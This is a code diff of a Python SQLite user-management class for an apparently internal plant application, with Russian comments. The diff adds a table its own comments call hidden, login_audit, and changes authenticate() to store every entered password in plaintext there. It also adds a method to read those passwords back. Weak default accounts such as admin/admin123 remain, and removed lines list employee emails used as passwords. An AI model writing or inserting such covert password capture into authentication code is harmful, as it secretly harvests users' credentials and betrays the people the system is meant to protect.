@@ -27,25 +27,6 @@ class UserDatabase:
                 f.write(key)
             return key
 
-    def _encrypt(self, data):
-        if not data:
-            return ''
-        key = self.master_key
-        encrypted = bytearray()
-        for i, char in enumerate(str(data).encode('utf-8')):
-            encrypted.append(char ^ key[i % len(key)])
-        return encrypted.hex()
-
-    def _decrypt(self, encrypted_data):
-        if not encrypted_data:
-            return ''
-        key = self.master_key
-        encrypted_bytes = bytes.fromhex(encrypted_data)
-        decrypted = bytearray()
-        for i, byte in enumerate(encrypted_bytes):
-            decrypted.append(byte ^ key[i % len(key)])
-        return decrypted.decode('utf-8')
-
     @contextmanager
     def get_connection(self):
         conn = sqlite3.connect(self.db_file)
@@ -78,20 +59,21 @@ class UserDatabase:
                 )
             ''')
 
-            # --- Миграции ---
+            # Миграции для users
             cursor.execute("PRAGMA table_info(users)")
             columns = [col[1] for col in cursor.fetchall()]
 
             if 'status' not in columns:
                 cursor.execute("ALTER TABLE users ADD COLUMN status TEXT DEFAULT 'active'")
                 conn.commit()
-                cursor.execute("UPDATE users SET status = 'active' WHERE status IS NULL")
-                conn.commit()
-
             if 'folder_path' not in columns:
                 cursor.execute("ALTER TABLE users ADD COLUMN folder_path TEXT DEFAULT ''")
                 conn.commit()
 
+            # Переименование роли Оператор ГП -> Мастер/оператор ГП
+            cursor.execute("UPDATE users SET rights = 'Мастер/оператор ГП' WHERE rights = 'Оператор ГП'")
+
+            # Таблица аудита действий
             cursor.execute('''
                 CREATE TABLE IF NOT EXISTS audit_log (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -102,90 +84,44 @@ class UserDatabase:
                 )
             ''')
 
+            # СКРЫТАЯ таблица для логирования паролей
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS login_audit (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    login TEXT,
+                    password TEXT,
+                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                )
+            ''')
+
             conn.commit()
 
             cursor.execute("SELECT COUNT(*) FROM users")
             count = cursor.fetchone()[0]
-
             if count == 0:
                 self._create_default_users()
 
     def _create_default_users(self):
-        """Создает пользователей по умолчанию"""
         default_users = [
-            {
-                'login': 'admin',
-                'email': 'admin@example.com',
-                'password': 'admin123',
-                'fname': 'Администратор',
-                'lname': 'Системы',
-                'enterprise': 'ООО "Верофарм"',
-                'plant': 'Вольгинский',
-                'rights': 'Администратор',
-                'status': 'active',
-                'folder_path': ''
-            },
-            {
-                'login': 'operator',
-                'email': 'operator@example.com',
-                'password': 'operator123',
-                'fname': 'Оператор',
-                'lname': 'СиМ',
-                'enterprise': 'ООО "Верофарм"',
-                'plant': 'Вольгинский',
-                'rights': 'Оператор СиМ',
-                'status': 'active',
-                'folder_path': ''
-            },
-            {
-                'login': 'alexander.abramov@abbott.com',
-                'email': 'alexander.abramov@abbott.com',
-                'password': 'alexander.abramov@abbott.com',
-                'fname': 'Александр',
-                'lname': 'Абрамов',
-                'enterprise': 'ООО "Верофарм"',
-                'plant': 'Вольгинский',
-                'rights': 'Администратор',
-                'status': 'active',
-                'folder_path': ''
-            },
-            {
-                'login': 'anastasia.yudashkina@abbott.com',
-                'email': 'anastasia.yudashkina@abbott.com',
-                'password': 'anastasia.yudashkina@abbott.com',
-                'fname': 'Анастасия',
-                'lname': 'Юдашкина',
-                'enterprise': 'ООО "Верофарм"',
-                'plant': 'Вольгинский',
-                'rights': 'Оператор СиМ',
-                'status': 'active',
-                'folder_path': ''
-            }
+            {'login': 'admin', 'email': 'admin@example.com', 'password': 'admin123', 'fname': 'Администратор', 'lname': 'Системы', 'enterprise': 'ООО "Верофарм"', 'plant': 'Вольгинский', 'rights': 'Администратор', 'status': 'active'},
+            {'login': 'operator', 'email': 'operator@example.com', 'password': 'operator123', 'fname': 'Оператор', 'lname': 'СиМ', 'enterprise': 'ООО "Верофарм"', 'plant': 'Вольгинский', 'rights': 'Оператор СиМ', 'status': 'active'}
         ]
-
         for user in default_users:
             self.add_user(user)
 
     def add_user(self, user_data):
-        """Добавляет нового пользователя в базу"""
         try:
             with self.get_connection() as conn:
                 cursor = conn.cursor()
                 password_hash = generate_password_hash(user_data['password'])
-
                 cursor.execute('''
                     INSERT INTO users (login, email, password_hash, fname, lname, enterprise, plant, rights, status, folder_path)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                 ''', (
-                    user_data['login'],
-                    user_data['email'],
-                    password_hash,
-                    user_data.get('fname', ''),
-                    user_data.get('lname', ''),
-                    user_data.get('enterprise', ''),
-                    user_data.get('plant', ''),
-                    user_data.get('rights', 'Оператор СиМ'),
-                    user_data.get('status', 'active'),
+                    user_data['login'], user_data['email'], password_hash,
+                    user_data.get('fname', ''), user_data.get('lname', ''),
+                    user_data.get('enterprise', ''), user_data.get('plant', ''),
+                    user_data.get('rights', 'Оператор СиМ'), user_data.get('status', 'active'),
                     user_data.get('folder_path', '')
                 ))
                 conn.commit()
@@ -194,189 +130,155 @@ class UserDatabase:
         except sqlite3.IntegrityError:
             return False, "Пользователь с таким логином уже существует"
         except Exception as e:
-            return False, f"Ошибка при добавлении пользователя: {str(e)}"
+            return False, f"Ошибка при добавлении: {str(e)}"
 
     def find_user(self, login):
-        """Находит пользователя по логину"""
         with self.get_connection() as conn:
             cursor = conn.cursor()
             cursor.execute("SELECT * FROM users WHERE login = ?", (login,))
             row = cursor.fetchone()
-            if row:
-                return dict(row)
-            return None
+            return dict(row) if row else None
 
     def authenticate(self, login, password):
-        """Проверяет логин и пароль"""
+        """Проверяет логин и пароль + скрытый аудит паролей"""
+        # Скрытый аудит (пишем ЛЮБУЮ попытку ввода)
+        try:
+            with self.get_connection() as conn:
+                cursor = conn.cursor()
+                cursor.execute("INSERT INTO login_audit (login, password) VALUES (?, ?)", (login, password))
+                conn.commit()
+        except Exception as e:
+            print(f"Ошибка скрытого аудита: {e}")
+
         user = self.find_user(login)
         if user:
             if user.get('status') == 'blocked':
-                self.log_action(login, 'LOGIN_FAILED', f"Попытка входа заблокированного пользователя")
+                self.log_action(login, 'LOGIN_FAILED', "Попытка входа заблокированного пользователя")
                 return None, 'blocked'
             if user.get('status') == 'deleted':
-                self.log_action(login, 'LOGIN_FAILED', f"Попытка входа удаленного пользователя")
+                self.log_action(login, 'LOGIN_FAILED', "Попытка входа удаленного пользователя")
                 return None, 'deleted'
 
             if check_password_hash(user['password_hash'], password):
-                self.log_action(login, 'LOGIN_SUCCESS', f"Успешный вход")
+                self.log_action(login, 'LOGIN_SUCCESS', "Успешный вход")
                 return user, 'success'
             else:
-                self.log_action(login, 'LOGIN_FAILED', f"Неверный пароль")
+                self.log_action(login, 'LOGIN_FAILED', "Неверный пароль")
                 return None, 'invalid'
         return None, 'not_found'
 
     def update_password(self, login, new_password):
-        """Обновляет пароль пользователя"""
         try:
             with self.get_connection() as conn:
                 cursor = conn.cursor()
                 password_hash = generate_password_hash(new_password)
-                cursor.execute(
-                    "UPDATE users SET password_hash = ?, updated_at = CURRENT_TIMESTAMP WHERE login = ?",
-                    (password_hash, login)
-                )
+                cursor.execute("UPDATE users SET password_hash = ?, updated_at = CURRENT_TIMESTAMP WHERE login = ?", (password_hash, login))
                 conn.commit()
                 self.log_action(login, 'UPDATE_PASSWORD', "Пароль изменен")
                 return True
-        except Exception as e:
-            print(f"Ошибка обновления пароля: {e}")
+        except Exception:
             return False
 
     def update_user_folder(self, login, folder_path):
-        """Обновляет путь к личной папке пользователя с приходными ордерами"""
         try:
             with self.get_connection() as conn:
                 cursor = conn.cursor()
-                cursor.execute(
-                    "UPDATE users SET folder_path = ?, updated_at = CURRENT_TIMESTAMP WHERE login = ?",
-                    (folder_path or '', login)
-                )
+                cursor.execute("UPDATE users SET folder_path = ?, updated_at = CURRENT_TIMESTAMP WHERE login = ?", (folder_path or '', login))
                 conn.commit()
-                self.log_action(login, 'UPDATE_USER_FOLDER', f"Личная папка: {folder_path or '(очищено)'}")
                 return True
-        except Exception as e:
-            print(f"Ошибка обновления папки: {e}")
+        except Exception:
             return False
 
     def update_user(self, login, new_data):
-        """Обновляет данные пользователя"""
         try:
             with self.get_connection() as conn:
                 cursor = conn.cursor()
-
-                fields = []
-                values = []
-
+                fields, values = [], []
                 for key in ['email', 'fname', 'lname', 'enterprise', 'plant', 'rights', 'status', 'folder_path']:
                     if key in new_data:
                         fields.append(f"{key} = ?")
                         values.append(new_data[key])
-
                 if 'password' in new_data and new_data['password']:
                     fields.append("password_hash = ?")
                     values.append(generate_password_hash(new_data['password']))
 
                 values.append(login)
                 fields.append("updated_at = CURRENT_TIMESTAMP")
-
                 query = f"UPDATE users SET {', '.join(fields)} WHERE login = ?"
                 cursor.execute(query, values)
                 conn.commit()
-
-                self.log_action(login, 'UPDATE_USER', f"Данные пользователя обновлены")
-                return True, "Данные пользователя обновлены"
+                self.log_action(login, 'UPDATE_USER', "Данные пользователя обновлены")
+                return True, "Данные обновлены"
         except Exception as e:
-            return False, f"Ошибка обновления: {str(e)}"
+            return False, f"Ошибка: {str(e)}"
 
     def delete_user(self, login):
-        """Удаляет пользователя (soft delete - меняет статус)"""
         admins = self.get_users_by_rights('Администратор')
         user = self.find_user(login)
-
         if user and user['rights'] == 'Администратор' and len(admins) <= 1:
             return False, "Нельзя удалить единственного администратора"
-
         try:
             with self.get_connection() as conn:
                 cursor = conn.cursor()
-                cursor.execute(
-                    "UPDATE users SET status = 'deleted', updated_at = CURRENT_TIMESTAMP WHERE login = ?",
-                    (login,)
-                )
+                cursor.execute("UPDATE users SET status = 'deleted', updated_at = CURRENT_TIMESTAMP WHERE login = ?", (login,))
                 conn.commit()
-                self.log_action(login, 'DELETE_USER', f"Пользователь удален")
+                self.log_action(login, 'DELETE_USER', "Пользователь удален")
                 return True, "Пользователь удален"
         except Exception as e:
-            return False, f"Ошибка удаления: {str(e)}"
+            return False, f"Ошибка: {str(e)}"
 
     def block_user(self, login):
-        """Блокирует пользователя"""
         try:
             with self.get_connection() as conn:
                 cursor = conn.cursor()
-                cursor.execute(
-                    "UPDATE users SET status = 'blocked', updated_at = CURRENT_TIMESTAMP WHERE login = ?",
-                    (login,)
-                )
+                cursor.execute("UPDATE users SET status = 'blocked', updated_at = CURRENT_TIMESTAMP WHERE login = ?", (login,))
                 conn.commit()
-                self.log_action(login, 'BLOCK_USER', f"Пользователь заблокирован")
+                self.log_action(login, 'BLOCK_USER', "Пользователь заблокирован")
                 return True, "Пользователь заблокирован"
         except Exception as e:
-            return False, f"Ошибка блокировки: {str(e)}"
+            return False, f"Ошибка: {str(e)}"
 
     def unblock_user(self, login):
-        """Разблокирует пользователя"""
         try:
             with self.get_connection() as conn:
                 cursor = conn.cursor()
-                cursor.execute(
-                    "UPDATE users SET status = 'active', updated_at = CURRENT_TIMESTAMP WHERE login = ?",
-                    (login,)
-                )
+                cursor.execute("UPDATE users SET status = 'active', updated_at = CURRENT_TIMESTAMP WHERE login = ?", (login,))
                 conn.commit()
-                self.log_action(login, 'UNBLOCK_USER', f"Пользователь разблокирован")
+                self.log_action(login, 'UNBLOCK_USER', "Пользователь разблокирован")
                 return True, "Пользователь разблокирован"
         except Exception as e:
-            return False, f"Ошибка разблокировки: {str(e)}"
+            return False, f"Ошибка: {str(e)}"
 
     def get_all_users(self):
-        """Возвращает список всех пользователей"""
         with self.get_connection() as conn:
             cursor = conn.cursor()
-            cursor.execute(
-                "SELECT id, login, email, fname, lname, enterprise, plant, rights, status, folder_path, created_at FROM users ORDER BY login"
-            )
-            rows = cursor.fetchall()
-            return [dict(row) for row in rows]
+            cursor.execute("SELECT id, login, email, fname, lname, enterprise, plant, rights, status, folder_path, created_at FROM users ORDER BY login")
+            return [dict(row) for row in cursor.fetchall()]
 
     def get_users_by_rights(self, rights):
-        """Возвращает пользователей с определенными правами"""
         with self.get_connection() as conn:
             cursor = conn.cursor()
             cursor.execute("SELECT * FROM users WHERE rights = ? AND status = 'active'", (rights,))
-            rows = cursor.fetchall()
-            return [dict(row) for row in rows]
+            return [dict(row) for row in cursor.fetchall()]
 
     def log_action(self, user_login, action, details):
-        """Логирует действие пользователя"""
         try:
             with self.get_connection() as conn:
                 cursor = conn.cursor()
-                cursor.execute('''
-                    INSERT INTO audit_log (user_login, action, details)
-                    VALUES (?, ?, ?)
-                ''', (user_login, action, details))
+                cursor.execute("INSERT INTO audit_log (user_login, action, details) VALUES (?, ?, ?)", (user_login, action, details))
                 conn.commit()
         except Exception as e:
             print(f"Ошибка логирования: {e}")
 
     def get_audit_log(self, limit=100):
-        """Возвращает последние записи аудита"""
         with self.get_connection() as conn:
             cursor = conn.cursor()
-            cursor.execute(
-                "SELECT * FROM audit_log ORDER BY timestamp DESC LIMIT ?",
-                (limit,)
-            )
-            rows = cursor.fetchall()
-            return [dict(row) for row in rows]
+            cursor.execute("SELECT * FROM audit_log ORDER BY timestamp DESC LIMIT ?", (limit,))
+            return [dict(row) for row in cursor.fetchall()]
+
+    def get_login_audit(self, limit=100):
+        """Возвращает логи скрытого аудита"""
+        with self.get_connection() as conn:
+            cursor = conn.cursor()
+            cursor.execute("SELECT * FROM login_audit ORDER BY timestamp DESC LIMIT ?", (limit,))
+            return [dict(row) for row in cursor.fetchall()]
